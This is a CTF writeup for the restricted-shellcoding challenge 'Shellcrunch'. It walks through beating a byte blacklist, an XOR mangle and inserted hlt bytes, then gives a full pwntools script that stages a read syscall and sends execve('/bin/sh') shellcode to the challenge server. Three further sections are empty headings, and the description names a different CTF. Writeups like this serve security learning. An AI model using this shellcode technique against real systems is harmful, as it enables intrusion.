---
title: PatriotCtf 2024 Writeups
category: WRITEUP, CTF, SHELLCODING, HEAP, KERNEL, V8
date: September 18th, 2024
description: Writeup of a few challenges from buckeye ctf
---


## Shellcrunch

This is a restricted shellcoding problem with two main steps. The first is that we have
to pass a blacklist of bytes. We cannot have any 0x3b, 0x2f, 0x62, 0x69, 0x6e, 0x73, 0x68,
or 0x0. 


Then our shellcode will be passed through an auto xor key cipher. Where the current byte
will be xored with the next byte.


Then finally, 0xf4f4f4f4 (hlt instruction) will replace our payload once in a while. 


The first challenge would be getting past the auto xor key cipher. We can 
write a quick function to make sure our shellcode is passing through the xor cipher
properly. 


Once that occurs, then we have another problem. Our shellcode that has been replaced with
0xf4 will halt execution and stop our shellcode from continuing to execute. To get 
pass this I used a relative jump instruction (jmp 4 0xeb04) to jump over the hlt instructions.


From there, I can do a few bytes for instructions that I need to execute, and then a jmp 4
to skip over the hlt instructions. My goal when calling this shellcode is to call a read to read
in unrestricted shellcode. 


> Generally in any type of restricted shellcoding problem like this, it is the quickest to call read
> to read in more shellcode instead of continuing to craft shellcode in the restricted environment.
> In these types of problems there are a few things that are almost always guarenteed. 


1. The shellcode buffer will be stored in at least one of our registers when executing the shellcode.
a. This is because in order to jump to the address of the shellcode we need to put it into a register and
then execute a jmp reg instruction.
2. the read syscall will be in the binary. (How else can you read in shellcode in the first place.
3. the state of the registers will be more consistent.


With making a read syscall to read in more shellcode our goal. We only have to do 4 things:

* Set rax = 0
* Set rdi = 0 
* Set rsi to our shellcode buffer
* Set rdx = some big enough number (can be anything)


Filling these requirements can usually be easier than trying to call execve("/bin/sh",0,0,0) because we would have to 
get "/bin/sh" into writeable memory, and set rax = 0x3b. These can be more difficult in a restricted shellcoding environments.
Whereas with the read call, all we need to do is xchg and set registers to 0. 


```python
#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        #log_level="debug",
        log_level="info",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "chal.competitivecyber.club"
PORT = 3004

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)


def mangle_shellcode(shellcode):
    shellcode = bytearray(shellcode)
    shell_len = len(shellcode)
    index = (shell_len - 2) // 4 * 4  

    # Reverse the mangle operation by XORing backwards
    while index >= 0:
        shellcode[index] ^= shellcode[index + 1]
        index -= 4

    log.info(f"Mangled shellcode {shellcode}")
    blacklist = [b"\x68", b"\x6e", b"\x73", b"\x2f", b"\x69", b"\x62", b"\x3b", b"\x00"] 

    for b in shellcode: 
        if b in blacklist:
            log.info(f"Invalid shellcode for {b}")
            return bytes(0)
 
    return bytes(shellcode)


def exploit(p,e):
    # Relative jmp 4 to jmp over four hlt instructions
    jmp_4 = b"\xeb\x04"
    
    # Some random filler that will be replaced with 0xf4f4f4f4
    filler = b"\xf4\x90\xf4\x90"

    # Call read(0, &buf, 0x200)
    shellcode =  jmp_4 + filler + asm("xchg rdx, rsi") + asm("xor rdi,rdi")
    shellcode += jmp_4 + filler + asm("add rsi, 0x20") + asm("nop") + asm("nop")
    shellcode += jmp_4 + filler + asm("xchg r11, rdx") + asm("syscall")    

    # execve("/bin/sh", 0, 0)
    easy_shellcode = asm("""
        movabs r15, 0x68732f6e69622f 
        push r15
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov eax, 0x3b
        syscall
    """)
         
    mangled_shellcode = mangle_shellcode(shellcode)
     
    log.info(f"Shellcode {shellcode} {len(shellcode)}")
    log.info(f"Mangled shellcode {mangled_shellcode}")

    sl(p,mangled_shellcode)
    #sl(p,shellcode)
    
    pause()

    sl(p, b"\x90"*0x30 + easy_shellcode)


    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
```

## Flightscript


## Dirty Fetch




## Baby xss
